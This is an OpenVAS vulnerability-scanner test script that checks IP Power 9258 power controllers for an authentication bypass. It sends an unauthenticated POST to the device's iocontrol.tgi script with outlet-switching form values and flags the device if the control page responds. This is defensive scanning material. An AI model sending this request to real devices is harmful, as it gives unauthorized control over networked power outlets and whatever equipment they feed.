###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ip_power_9258_48104.nasl 13 2013-10-27 12:16:33Z jan $
#
# IP Power 9258 TGI Scripts Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "IP Power 9258 is prone to an unauthorized-access vulnerability.

Attackers can exploit this issue to directly access arbitrary scripts,
bypassing authentication. A successful exploit will allow the attacker
to run arbitrary scripts on the affected device.";


if (description)
{
 script_id(103172);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-06-06 13:42:32 +0200 (Mon, 06 Jun 2011)");
 script_bugtraq_id(48104);
 script_tag(name:"cvss_base", value:"6.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_tag(name:"risk_factor", value:"High");
 script_name("IP Power 9258 TGI Scripts Unauthorized Access Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/48104");
 script_xref(name : "URL" , value : "http://www.opengear.com/product-ip-power-9258.html");
 script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101963/ippower-bypass.txt");

 script_description(desc);
 script_summary("Determine if IP Power 9258 is prone to an unauthorized-access vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/"); 

  if(http_vuln_check(port:port, url:url,pattern:"<title>IP9258")) {

    host = get_host_name();
    variables = string("XXX=On&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&ButtonName=Apply");

    req = string(
		  "POST ", dir ,"/tgi/iocontrol.tgi HTTP/1.1\r\n",
		  "Host: ", host, ":", port, "\r\n",
		  "User-Agent: openvas\r\n",
		  "Accept: */*\r\n",
		  "Content-Length: 127\r\n",
		  "Content-Type:
		  application/x-www-form-urlencoded\r\n",
		  "\r\n",
		  variables);

     result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

     if(result =~ "<title>I\/O Control" && result =~ "<td>Power1</td>") {

       security_hole(port:port);
       exit(0);

      }	


  }
}

exit(0);
